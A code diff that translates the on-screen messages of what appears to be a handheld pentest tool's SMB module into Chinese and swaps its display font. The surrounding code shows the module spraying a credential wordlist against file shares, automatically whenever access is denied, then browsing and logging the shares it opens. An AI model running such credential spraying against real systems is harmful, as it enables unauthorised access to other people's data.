-                    M5.Display.fillRect(2,52,234,20,SMB_BG); M5.Display.setTextFont(1); M5.Display.setTextSize(1.5);
+                    M5.Display.fillRect(2,52,234,20,SMB_BG); evilKeepCnFont(M5.Display); evilSetCnFont(M5.Display, 1.5);
                     M5.Display.setTextColor(SMB_TEXT,SMB_BG); M5.Display.setCursor(8,58);
-                    M5.Display.printf("share %d / %d",c,t); M5.Display.display(); });
-                if(rp.length()) smbMsg("Report saved", rp, 2800);
-                else            smbMsg("Report failed", s.lastError, 2000);
+                    M5.Display.printf("共享 %d / %d",c,t); M5.Display.display(); });
+                if(rp.length()) smbMsg("报告已保存", rp, 2800);
+                else            smbMsg("报告失败", s.lastError, 2000);
                 continue;
             }
             if(si==iSpray){                                              // spray SD creds wordlist
                 smbEnsureCredsTemplate();
                 int tried=0; String hit;
                 bool ok=smbTryCredsFile(s,&tried,&hit,false,true);
-                if(ok){ smbMsg("Login OK", hit+"  ("+String(tried)+" tried)", 2500);
-                        smbChrome("SHARES",smbBadge(s),target.toString(),"please wait"); probeShares(); }
-                else if(tried==0) smbMsg("Creds file empty", "edit smb_creds.txt", 2500);
-                else              smbMsg("No valid cred", String(tried)+" tried", 2200);
+                if(ok){ smbMsg("登录成功", hit+"  (尝试"+String(tried)+"次)", 2500);
+                        smbChrome("共享列表",smbBadge(s),target.toString(),"请稍候"); probeShares(); }
+                else if(tried==0) smbMsg("凭据文件为空", "请编辑 smb_creds.txt", 2500);
+                else              smbMsg("无有效凭据", "已尝试 "+String(tried)+" 次", 2200);
                 continue;
             }
             if(si==iRescan) break;                                       // rescan hosts
             if(!s.treeConnect(shares[si])){
                 if(s.lastStatus==0xC0000022){                            // ACCESS_DENIED
                     smbLog("DENIED "+target.toString()+" "+shares[si]);
-                    smbMsg("Access denied", shares[si]+" needs login", 1200);
+                    smbMsg("拒绝访问", shares[si]+" 需要登录", 1200);
                     // auto-spray the wordlist, then offer manual login
                     smbEnsureCredsTemplate();
                     int tried=0; String hit;
                     if(smbTryCredsFile(s,&tried,&hit,false,true))
-                        smbMsg("Login OK", hit, 1500);
+                        smbMsg("登录成功", hit, 1500);
                     else if(tried>0)
-                        smbMsg("Spray: no valid cred", String(tried)+" tried", 1500);
+                        smbMsg("喷洒无有效凭据", "已尝试 "+String(tried)+" 次", 1500);
                     if(s.treeConnect(shares[si])){ smbBrowse(s,shares[si]); s.treeDisconnect(); }
                     else if(smbPromptLogin(s)){
                         if(s.treeConnect(shares[si])){ smbBrowse(s,shares[si]); s.treeDisconnect(); }
-                        else smbMsg("Tree connect failed", s.lastError, 1600);
+                        else smbMsg("连接共享失败", s.lastError, 1600);
                     }
                     continue;
                 }
-                smbMsg("Tree connect failed", s.lastError, 1500); continue;
+                smbMsg("连接共享失败", s.lastError, 1500); continue;
             }
             smbLog("BROWSE "+target.toString()+" "+shares[si]);
             smbBrowse(s,shares[si]);
